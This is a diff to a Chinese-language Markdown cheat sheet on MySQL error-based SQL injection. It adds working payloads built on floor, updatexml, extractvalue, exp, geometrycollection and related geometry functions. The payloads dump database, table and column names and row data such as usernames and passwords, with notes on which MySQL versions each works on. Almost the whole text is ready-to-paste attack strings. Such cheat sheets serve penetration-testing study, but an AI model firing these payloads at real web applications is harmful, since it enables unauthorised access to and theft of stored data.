@@ -195,6 +195,8 @@ id=1' and ascii(substr(database(), 0, 1))<N -- -
 
 ## 0x06 报错注入
 
+注意：由于报错信息有时会有长度限制，所以最好使用`limit 0,1`这样的语句逐个查询，在第2种报错注入updatexml中会提及一下怎么一次全爆破，后面都只说明如何逐个查询。
+
 #### 1. floor报错注入
 
 报错注入形式上是两个嵌套的查询，即select...(select...)，里面的那个select被称为子查询，他的执行顺序也是先执行子查询，然后再执行外面的select，双注入主要涉及函数：
@@ -205,22 +207,25 @@ id=1' and ascii(substr(database(), 0, 1))<N -- -
 - group by clause分组语句，按照查询结果分组。
 - floor(rand(0)\*2)是定性的011011，并不是真随机，而是伪随机，这句会引起报错，从而配合其它语句输出报错信息来达到泄露。
 - ()x 是对括号内容的命名，把括号里面的命名为x。
+- 另外需要注意的是最后面的一个`from information_schema.tables`是固定的，不管什么操作都不用变，也可以换成其他数据库和表，但都不影响。
 
-下述中security为数据库名称，security.users为表名，0x3a是英文冒号，这里用来分隔输出，看起来方便点。
+下述中0x7e是波浪线，这里用来分隔输出，看起来方便点。
 
-获取数据库
 ```
-id=-1' union select 1,2,3 from (select count(*),concat((select concat(version(),0x3a,0x3a,database(),0x3a,0x3a,user(),0x3a) limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a -- -
-```
+# 获取数据库信息
+id=-1' union select 1,2,3 from (select count(*),concat((select concat(0x7e, version(),0x7e,database(),0x7e,user(),0x7e) limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a -- -
 
-获取表名
-```
-id=-1' union select 1,2,3 from (select count(*),concat((select concat(table_name,0x3a,0x3a) from information_schema.tables where table_schema=database() limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a -- -
-```
+# 获取一个库名
+id=-1' union select 1,2,3 from (select count(*),concat((select concat(0x7e, schema_name, 0x7e) from information_schema.schemata limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a -- -
 
-获取用户信息
-```
-id=-1' union select 1,2,3 from (select count(*),concat((select concat(username,0x3a,0x3a,password,0x3a,0x3a) from security.users limit 1,1), floor(rand(0)*2))x from information_schema.tables group by x)a -- -
+# 获取一个表名
+id=-1' union select 1,2,3 from (select count(*),concat((select concat(0x7e, table_name,0x7e) from information_schema.tables where table_schema='[库名]' limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a -- -
+
+# 获取一个列名（字段）
+id=-1' union select 1,2,3 from (select count(*),concat((select concat(0x7e, column_name, 0x7e) from information_schema.columns where table_name='[表名]' limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a -- -
+
+# 获取一行数据
+id=-1' union select 1,2,3 from (select count(*),concat((select concat(0x7e, [字段1], 0x7e, [字段2], 0x7e) from [库名].[表名] limit 0,1), floor(rand(0)*2))x from information_schema.tables group by x)a -- -
 ```
 
 #### 2. updatexml报错注入
@@ -251,24 +256,27 @@ id=1' and updatexml(1,concat(0x7e,(select distinct concat(0x7e, (select table_na
 # 依次查找列名
 id=1' and updatexml(1,concat(0x7e,(select distinct concat(0x7e, (select column_name),0x7e) FROM information_schema.columns where table_name='[表名]' limit 0,1),0x7e),1)  -- -
 
-# 一次查出所有表名
+# 依次爆数据
+id=1' and updatexml(1,concat(0x7e,(select distinct concat(0x7e, (select concat([字段1],0x7e,[字段2])),0x7e) FROM [库名].[表名] limit 0,1),0x7e),1)  -- -
+
+# 一次查出所有库名（但是报错信息有长度32位限制，所以最好逐个查）
+id=1' and updatexml(1,concat(0x7e,(select distinct concat(0x7e, (select group_concat(schema_name)),0x7e) FROM information_schema.schemata),0x7e),1)  -- -
+
+# 一次查出所有表名（但是报错信息有长度32位限制，所以最好逐个查）
 id=1' and updatexml(1,concat(0x7e,(select distinct concat(0x7e, (select group_concat(table_name)),0x7e) FROM information_schema.tables where table_schema='[库名]'),0x7e),1)  -- -
 
-# 一次查找某个表下所有列名
+# 一次查找某个表下所有列名（但是报错信息有长度32位限制，所以最好逐个查）
 id=1' and updatexml(1,concat(0x7e,(select distinct concat(0x7e, (select group_concat(column_name)),0x7e) FROM information_schema.columns where table_name='[表名]'),0x7e),1) -- -
 
-# 依次爆破数据
+# 一次爆出全部数据（但是报错信息有长度32位限制，所以最好逐个查）
 id=1' and updatexml(1,concat(0x7e,(select distinct concat(0x7e, (select group_concat([列名1],0x3a,[列名2])),0x7e) FROM [库名].[表名]),0x7e),1)  -- -
 ```
 
 其中：
 
 - distinct表示返回后面的内容不重复。
-
 - 0x7e为波浪线，用于分隔。
-
-- 0x3a为分号，用于分隔。
-
+- 0x3a为冒号，用于分隔。
 - group_concat()会把结果按照输入的字段进行分组拼接，每组拼成一个字符串，组与组之间用逗号隔开，再拼接成一个完整的字符串。
 
 update注入就常用updatexml函数来注入：
@@ -282,14 +290,111 @@ id=-1' or updatexml(1, concat(0x7e, version(), 0x7e), 1) -- -
 MySQL 大于等于5.1.5才能extractvalue报错注入。
 
 ```
+# 获取基础信息
+id=1' and extractvalue(1,concat(0x7e,user(),0x7e)) -- -
 id=1' and extractvalue(1,concat(0x7e,database(),0x7e)) -- -
+id=1' and extractvalue(1,concat(0x7e,version(),0x7e)) -- -
+
+# 获取一个库名
+id=1' and extractvalue(1,concat(0x7e,concat(0x7e,(select concat(0x7e, (select schema_name),0x7e) FROM information_schema.schemata limit 0,1),0x7e),0x7e)) -- -
+
+# 获取一个表名
+id=1' and extractvalue(1,concat(0x7e,concat(0x7e,(select concat(0x7e, (select table_name),0x7e) FROM information_schema.tables where table_schema='[库名]' limit 0,1),0x7e),0x7e)) -- -
+
+# 获取一个列名
+id=1' and extractvalue(1,concat(0x7e,concat(0x7e,(select concat(0x7e, (select column_name),0x7e) FROM information_schema.columns where table_name='[表名]' limit 0, 1),0x7e),0x7e)) -- -
+
+# 获取一行数据
+id=1' and extractvalue(1,concat(0x7e,(select concat(0x7e, (select concat([字段1],0x3a,[字段2])),0x7e) FROM [库名].[表名] limit 0,1),0x7e)) -- -
 ```
 
-#### 4. GeometryCollection报错注入
+#### 4. exp报错注入
+
+目前测试MySQL 5.5可用，5.0、5.1、5.7、8.0均不能用
 
 ```
-id=1' and GeometryCollection((select * from(select * from(select user())a)b)) -- -
+# 获取基础信息
+id=1' and exp(~(select * from(select user())a)) -- -
+id=1' and exp(~(select * from(select database())a)) -- -
+id=1' and exp(~(select * from(select version())a)) -- -
+
+# 获取一个库名
+id=1' and exp(~(select * from(select concat(0x7e, (select schema_name),0x7e) FROM information_schema.schemata limit 0,1)a)) -- -
+
+# 获取一个表名
+id=1' and exp(~(select * from(select concat(0x7e, (select table_name), 0x7e) FROM information_schema.tables where table_schema='[库名]' limit 0,1)a)) -- -
+
+# 获取一个列名
+id=1' and exp(~(select * from(select concat(0x7e, (select column_name), 0x7e) FROM information_schema.columns where table_name='[表名]' limit 0,1)a)) -- -
+
+# 获取一行数据
+id=1' and exp(~(select * from(select concat(0x7e, (select concat([字段1],0x3a,[字段2])),0x7e) FROM [库名].[表名] limit 0,1)a)) -- -
 ```
+
+#### 5. geometrycollection报错注入
+
+目前测试在MySQL5.1、5.5版本中可以报错user()执行结果，5.0、5.7、8.0都不行。
+
+```
+# 获取基础信息
+id=1' and geometrycollection((select * from(select * from(select user())a)b)) -- -
+id=1' and geometrycollection((select * from(select * from(select database())a)b)) -- -
+id=1' and geometrycollection((select * from(select * from(select version())a)b)) -- -
+
+# 获取一个库名
+id=1' and geometrycollection((select * from(select * from(select concat(0x7e, (select schema_name),0x7e) FROM information_schema.schemata limit 0,1)a)b)) -- -
+
+# 获取一个表名
+id=1' and geometrycollection((select * from(select * from(select concat(0x7e, (select table_name),0x7e) FROM information_schema.tables where table_schema='[库名]' limit 0,1)a)b)) -- -
+
+# 获取一个列名
+id=1' and geometrycollection((select * from(select * from(select concat(0x7e, (select column_name),0x7e) FROM information_schema.columns where table_name='[表名]' limit 0, 1)a)b)) -- -
+
+# 获取一行数据
+id=1' and geometrycollection((select * from(select * from(select concat(0x7e, (select concat([字段1],0x3a,[字段2])),0x7e) FROM [库名].[表名] limit 0,1)a)b)) -- -
+```
+
+#### 6. polygon报错注入
+
+同GeometryCollection报错注入。
+
+```
+id=1' and polygon((select * from(select * from(select user())a)b)) -- -
+```
+
+#### 7. multipoint报错注入
+
+同GeometryCollection报错注入。
+
+```
+id=1' and multipoint((select * from (select * from(select user())a)b)) -- -
+```
+
+#### 8. multilinestring报错注入
+
+同GeometryCollection报错注入。
+
+```
+id=1' and multilinestring((select * from (select * from(select user())a)b)) -- -
+```
+
+#### 9. multipolygon报错注入
+
+同GeometryCollection报错注入。
+
+```
+id=1' and multipolygon((select * from (select * from(select user())a)b)) -- -
+```
+
+#### 10. linestring报错注入
+
+同GeometryCollection报错注入。
+
+```
+id=1' and linestring((select * from(select * from(select user())a)b)) -- -
+```
+
+
 
 ## 0x07 宽字节注入
 
